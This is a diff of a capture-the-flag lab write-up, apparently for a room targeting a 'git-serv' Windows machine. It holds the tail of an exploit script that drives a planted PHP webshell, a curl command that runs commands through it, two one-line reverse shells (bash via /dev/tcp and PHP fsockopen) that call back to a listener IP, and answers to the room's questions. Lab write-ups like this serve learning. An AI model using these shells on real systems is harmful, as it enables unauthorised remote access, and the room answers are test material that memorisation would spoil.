 print r.text.encode(sys.stdout.encoding, errors='replace')
@@ -854,46 +865,45 @@ print r.text.encode(sys.stdout.encoding, errors='replace')
 print "[+] Execute command"
 r = requests.post("http://{}/web/exploit-NoobHacker69.php".format(ip), data={'a' : command})
 print r.text.encode(sys.stdout.encoding, errors='replace')
-
-## 
+```
 
 this part of the code we know the code make a post request with parameter 'a' by default so we make the post request send it to the server to execute our command with making another file 
 
-## we achive this with the two method 
-1) curl command 
-2) burpsuit 
+we achive this with the two method 
+1. curl command 
+2. burpsuit 
 
 so we use curl command 
 
- Command syntax: curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"
+Command syntax: `curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`
 
-## this method is easy and speedy so use of this is recommended
+this method is easy and speedy so use of this is recommended
 
-## burpsuite method work fine but it is lengthy as first open burp proxy then make a request and then send it to the repeater and the changing it content with our sake so that so timetaking so use curl command is good 
+burpsuite method work fine but it is lengthy as first open burp proxy then make a request and then send it to the repeater and the changing it content with our sake so that so timetaking so use curl command is good 
 
-## php reverse shell tiny code
+##### php reverse shell tiny code
 
-##
+```
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
-##
+```
+##### php reverse shell tiny command for linux
 
-## php reverse shell tiny command for linux
-
-##
+```
 php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
-##
-
+```
+```
 Q2: What is the hostname for this target? 
 A: git-serv
-
+```
+```
 Q3: What operating system is this target? 
 A: windows
-
+```
+```
 Q4: What user is the server running as?
 A: nt authority\system
-
-### 
+```
 
 Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the ping command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.
 
